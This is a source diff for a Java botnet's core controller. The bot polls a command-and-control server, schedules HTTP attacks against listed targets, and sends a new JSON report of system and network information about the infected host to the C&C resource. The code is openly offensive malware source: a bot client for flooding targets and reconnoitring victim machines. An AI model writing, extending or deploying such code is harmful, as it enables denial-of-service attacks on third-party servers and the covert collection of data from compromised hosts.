@@ -28,13 +28,18 @@ package com.acmutv.botnet.core;
 
 import com.acmutv.botnet.config.AppConfiguration;
 import com.acmutv.botnet.config.AppConfigurationService;
+import com.acmutv.botnet.core.analysis.Analyzer;
+import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
+import com.acmutv.botnet.core.analysis.SystemAnalyzer;
 import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.core.command.BotCommand;
 import com.acmutv.botnet.core.command.BotCommandService;
 import com.acmutv.botnet.core.exception.*;
 import com.acmutv.botnet.core.pool.BotPool;
+import com.acmutv.botnet.core.report.*;
 import com.acmutv.botnet.core.state.BotState;
 import com.acmutv.botnet.core.target.HttpTarget;
+import com.acmutv.botnet.tool.io.IOManager;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.reflection.ReflectionManager;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
@@ -49,6 +54,7 @@ import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
+import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 import java.util.concurrent.ThreadLocalRandom;
@@ -79,6 +85,7 @@ public class CoreController {
    */
   private static BotPool POOL;
 
+  private static List<Analyzer> ANALYZERS = new ArrayList<>();
 
   /**
    * The bot entry-point.
@@ -119,6 +126,13 @@ public class CoreController {
           } catch (BotExecutionException exc) {
             LOGGER.warn("Cannot execute command. {}", exc.getMessage());
           }
+
+          try {
+            sendReport();
+          } catch (BotExecutionException exc) {
+            LOGGER.warn("Cannot send report to C&C. {}", exc.getMessage());
+          }
+
           break;
 
         case DEAD:
@@ -129,19 +143,25 @@ public class CoreController {
           break;
       }
 
-      pollingPause();
+      try {
+        pollingWait();
+      } catch (InterruptedException exc) { }
     }
   }
 
-  private static void pollingPause() {
+  /**
+   * Make the bot sleep between polling requests.
+   * The sleep time is randomly chosen within the interval specified in {@link AppConfiguration}
+   * with the property `polling`.
+   * @throws InterruptedException when the sleeping is interrupted.
+   */
+  private static void pollingWait() throws InterruptedException {
     final Interval pollingPeriod = AppConfigurationService.getConfigurations().getPolling();
-    final long pollingPauseAmount =
+    final TimeUnit unit = pollingPeriod.getUnit();
+    final long amount =
         ThreadLocalRandom.current().nextLong(pollingPeriod.getMin(), pollingPeriod.getMax());
-    try {
-      pollingPeriod.getUnit().sleep(pollingPauseAmount);
-    } catch (InterruptedException exc) {
-      return;
-    }
+    LOGGER.trace("Polling wait for {} {}", amount, unit);
+    unit.sleep(amount);
   }
 
   /**
@@ -246,7 +266,7 @@ public class CoreController {
             }
           }
         }
-        executeHttpAttack(method, targets);
+        scheduleHttpAttack(method, targets);
         break;
 
       default:
@@ -343,7 +363,6 @@ public class CoreController {
     LOGGER.traceExit();
   }
 
-
   /**
    * Executes the command `SHUTDOWN`.
    * All resources are released, softly.
@@ -369,7 +388,13 @@ public class CoreController {
     changeState(BotState.DEAD);
   }
 
-  public static void executeHttpAttack(HttpMethod method, List<HttpTarget> targets) {
+
+  /**
+   * Schedules a HTTP attack against the specified targets with the specified method.
+   * @param method the HTTP method (GET or POST).
+   * @param targets the list of targets to attack.
+   */
+  private static void scheduleHttpAttack(HttpMethod method, List<HttpTarget> targets) {
     LOGGER.traceEntry("method={} targets={} proxy={}", method, targets);
     LOGGER.info("Scheduling attack...");
     targets.stream().forEach(target -> {
@@ -381,12 +406,48 @@ public class CoreController {
   }
 
   /**
+   * Sends analysis reports to CC, as specified in {@link AppConfiguration}.
+   * @throws BotExecutionException when bot cannot send report to CC.
+   */
+  private static void sendReport() throws BotExecutionException {
+    LOGGER.trace("Producing host analysis reports...");
+    Report report = new SimpleReport();
+    ANALYZERS.stream().forEach(analyzer -> {
+      final Report analysisReport = analyzer.makeReport();
+      report.merge(analysisReport);
+    });
+    LOGGER.trace("Final report produced");
+    final String logResource = AppConfigurationService.getConfigurations().getLogResource();
+    LOGGER.info("Sending analysis to C&C at {}...", logResource);
+    final String json = report.toJson();
+    try {
+      IOManager.writeResource(logResource, json);
+    } catch (IOException exc) {
+      throw new BotExecutionException("Cannot communicate with C&C at {}", logResource);
+    }
+    LOGGER.info("Analysis sent to C&C at {}", logResource);
+  }
+
+  /**
    * Allocates bot's resources.
    */
   private static void allocateResources() {
     LOGGER.trace("Allocating resources...");
+
     POOL = new BotPool();
-    //TODO
+
+    if (AppConfigurationService.getConfigurations().isSysInfo()) {
+      Analyzer systemAnalyzer = new SystemAnalyzer();
+      //TODO configure system analyzer
+      ANALYZERS.add(systemAnalyzer);
+    }
+
+    if (AppConfigurationService.getConfigurations().isNetInfo()) {
+      Analyzer networkAnalyzer = new NetworkAnalyzer();
+      //TODO configure network analyzer
+      ANALYZERS.add(networkAnalyzer);
+    }
+
     LOGGER.trace("Resources allocated");
   }
 
